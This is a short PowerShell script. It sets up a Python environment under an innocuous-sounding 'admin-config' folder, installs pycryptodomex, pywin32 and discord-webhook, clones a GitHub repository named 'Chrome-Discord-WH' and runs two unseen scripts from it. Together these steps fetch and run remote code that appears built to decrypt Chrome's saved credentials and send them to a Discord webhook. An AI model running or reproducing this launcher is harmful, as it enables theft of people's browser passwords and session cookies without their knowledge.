# Navigate to the user's home directory
cd $HOME

# Create the 'admin-config' directory if it doesn't already exist
mkdir admin-config -Force

# Navigate into the 'admin-config' directory
cd admin-config

# Create a Python virtual environment named 'chromevenv'
python -m venv chromevenv

# Navigate into the 'chromevenv' directory
cd chromevenv/Scripts

# Activate the virtual environment
./Activate.ps1

# Install required Python libraries
pip install pycryptodomex
pip install pywin32
pip install discord-webhook

# Clone the GitHub repository
git clone https://github.com/ishan211/Chrome-Discord-WH.git

# Navigate into the cloned repository
cd Chrome-Discord-WH

# Run d.py
py d.py

# Wait for 500 milliseconds
Start-Sleep -Milliseconds 500

# Run s.py
py s.py
